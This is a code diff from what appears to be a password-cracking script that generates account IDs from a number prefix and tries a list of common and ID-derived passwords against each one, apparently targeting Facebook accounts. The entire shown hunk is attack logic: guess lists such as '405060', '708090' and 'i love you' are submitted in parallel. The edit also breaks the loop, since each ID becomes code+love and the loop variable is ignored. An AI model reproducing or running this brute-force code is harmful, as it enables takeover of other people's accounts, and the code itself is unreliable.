@@ -291,16 +291,9 @@ def numb():
         print(Markdown("# Crack Started"))
         space()
         for i in user:
-            uid=code+i
+            uid=code+love
             fb=tsg
-            pwx = [code,'banglades','nusrat','shahin','@#@#@','405060','708090']
-            pwx.append(uid[5:])#back 6
-            pwx.append(uid[4:])#back 7
-            pwx.append(uid[3:])#back 8
-            pwx.append(uid[:6])#front 6
-            pwx.append(uid[:7])#front 7
-            pwx.append(uid[:8])#front 8
-            pwx.append(uid)# 11
+            pwx = [code,code+love,codex,'banglades','i love you','@#@#@','405060','708090']
             feel.submit(need,uid,pwx,fb,tl)
 
 
